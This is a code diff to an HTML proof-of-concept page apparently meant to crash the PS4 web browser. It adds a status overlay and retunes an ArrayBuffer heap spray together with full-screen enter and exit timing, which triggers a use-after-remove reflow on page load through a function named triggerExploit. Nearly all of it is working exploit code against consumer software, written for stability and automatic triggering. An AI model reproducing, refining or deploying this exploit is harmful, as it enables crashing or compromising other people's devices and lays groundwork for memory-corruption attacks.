@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS4 Full-Screen Crash (Auto-Trigger)</title>
+  <title>PS4 Full-Screen Crash (Stabilized)</title>
   <style>
     #box { 
       width: 100px; height: 100px; 
@@ -10,18 +10,31 @@
       position: absolute; 
       left: 0; top: 50%; 
     }
+    #status {
+      font-family: Arial;
+      color: white;
+      background: black;
+      padding: 10px;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+    }
   </style>
 </head>
 <body style="background: #000; height: 200vh;">
   <div id="box"></div>
+  <div id="status">Test running... Crash in 3 seconds.</div>
+
   <script>
     const box = document.getElementById('box');
+    const status = document.getElementById('status');
 
-    // Heap spray to control memory layout
+    // Lightweight heap spray
     function heapSpray() {
       window.spray = [];
-      for (let i = 0; i < 500; i++) {
-        window.spray.push(new ArrayBuffer(0x500)); // Smaller chunks for finer control
+      for (let i = 0; i < 200; i++) {
+        window.spray.push(new ArrayBuffer(0x200));
       }
     }
 
@@ -35,25 +48,25 @@
         setTimeout(() => box.style.transform = 'translateX(300px)', 10);
       }, 1000);
 
-      // Enter full-screen after a delay
+      // Enter/exit full-screen with longer delays
       setTimeout(() => {
+        status.textContent = "Entering full-screen...";
         document.documentElement.requestFullscreen()
           .then(() => {
-            // Exit full-screen immediately (critical timing!)
             setTimeout(() => {
-              document.exitFullscreen(); 
-              // Trigger crash during transition
+              status.textContent = "Exiting full-screen... CRASH IMMINENT!";
+              document.exitFullscreen();
               setTimeout(() => {
                 box.remove();
-                document.body.offsetHeight; // Force reflow
-              }, 50); // Adjust this delay for precision
-            }, 100); // Exit full-screen delay
+                document.body.offsetHeight;
+              }, 200);
+            }, 300);
           })
-          .catch(e => console.error("Fullscreen failed:", e));
-      }, 2000); // Initial delay before full-screen
+          .catch(e => status.textContent = "Fullscreen failed: " + e);
+      }, 3000);
     }
 
-    // Start automatically (if PS4 browser allows)
+    // Start automatically
     setTimeout(triggerExploit, 1000);
   </script>
 </body>
